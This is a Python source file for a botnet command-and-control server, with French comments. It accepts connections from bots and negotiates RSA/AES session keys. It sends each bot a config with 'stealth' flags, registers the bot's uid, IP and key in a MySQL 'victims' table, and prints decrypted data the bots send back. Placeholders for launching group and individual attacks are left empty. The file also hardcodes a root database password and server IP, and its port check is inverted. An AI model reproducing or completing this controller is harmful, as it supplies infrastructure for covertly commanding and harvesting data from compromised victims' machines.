import base64
import json
import socket
import threading
from queue import Queue, Empty
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes
import rsa
import mysql.connector
import select
#from env import *


DBHOST = "51.77.193.65"
DBUSER = "root"
DBPASSWORD = "jesuislepython3"
DB = "botnet"

def emission(queue, conn, addr):
    running = True
    while running:
        message = queue.get()

        if message == 'stop-thread':
            running = False
            print("stopping emission thread on ip " + str(addr))
        else:
            conn.sendall(message)
            # print("data sent to " + str(addr))


def reception(queue, conn, addr):
    running = True
    while running:
        data = conn.recv(1024)
        if not data:
            running = False
            print("stopping reception thread on ip " + str(addr))
        else:
            queue.put(data)
            print("data received from " + str(addr))



def start_botnet(port):
    if not port or port < 1023 or port > 65535:
        print("démarrage du serveur sur le port " + str(port))

        # (addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv)
        clients = []

        # Socket
        host = "127.0.0.1"
        port = port

        socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        socket_server.setblocking(0)
        socket_server.bind((host, port))
        socket_server.listen()
        print("ecoute sur : " + str(host) + ":" + str(port))

        connection_list = [socket_server]

        # Database
        db = mysql.connector.connect(
            host=DBHOST,
            user=DBUSER,
            password=DBPASSWORD,
            database=DB
        )

        mycursor = db.cursor()

        running = True

        while running:
            # print("running")
            # print(connection_list)

            read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)

            # print("read_sockets : " + str(read_sockets))

            for sock in read_sockets:
                # Nouvelle connexion
                if sock is socket_server:
                    conn, addr = sock.accept()

                    # Création des threads d'émission et de réception
                    emission_queue = Queue()
                    thread_emission = threading.Thread(target=emission, args=(emission_queue, conn, addr))
                    thread_emission.start()

                    reception_queue = Queue()
                    thread_reception = threading.Thread(target=reception, args=(reception_queue, conn, addr))
                    thread_reception.start()

                    # Handshake
                    print("handshake with " + str(addr))

                    # Récupération de la clé publique du client
                    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
                    # print("public key : " + str(public_key))

                    # Génération de la clé symétrique
                    sym_key = get_random_bytes(16)
                    iv = get_random_bytes(16)
                    # print("symetric key : " + str(sym_key))
                    # print("iv : " + str(iv))

                    json_conf = '{"action_botnet":"' + base64.b64encode(
                        "client_config".encode()).decode() + '","b64symetric":"' + base64.b64encode(
                        sym_key).decode() + '","b64iv":"' + base64.b64encode(
                        iv).decode() + '","multithread":true,"stealth":true}'

                    # Chiffrement de la data avec la clé publique du client
                    encrypted_sym_key = rsa.encrypt(json_conf.encode(), public_key)

                    # Envoi de la clé symétrique chiffrée
                    emission_queue.put(encrypted_sym_key)

                    # print("[+] Waiting for client handshake informations")

                    received_data = reception_queue.get()

                    cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                    pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
                    # print("received data : " + str(pt))

                    # Récupération de l'uid client
                    uid = json.loads(pt)["uid"]

                    # Vérification de l'uid dans la base de données
                    query = "SELECT * FROM victims WHERE uid = %s"
                    values = (uid,)

                    mycursor.execute(query, values)

                    myresult = mycursor.fetchall()

                    if len(myresult) > 0:
                        # print("client already in the database")
                        query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
                        values = (
                        addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(),
                        uid)

                        mycursor.execute(query, values)

                    else:
                        # print("client not in the database")
                        # Ajout du client à la base de données

                        query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
                        values = (
                        uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(),
                        True, True)

                        mycursor.execute(query, values)

                    db.commit()

                    # Ajout du client à la liste des clients
                    clients.append(dict(uid=uid,
                                        addr=addr,
                                        conn=conn,
                                        thread_emission=thread_emission,
                                        emission_queue=emission_queue,
                                        thread_reception=thread_reception,
                                        reception_queue=reception_queue,
                                        sym_key=sym_key,
                                        iv=iv
                                        ))

            for client in clients:
                # Récupération des attaques de groupe à lancer

                # Récupération des attaques individuelles à lancer

                # Récupération des données clients
                try:
                    encrypted_data_received = client['reception_queue'].get_nowait()

                    cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                    pt = unpad(cipher.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

                    print(client['addr'])
                    print("received data : " + str(pt))

                except Empty:
                    pass
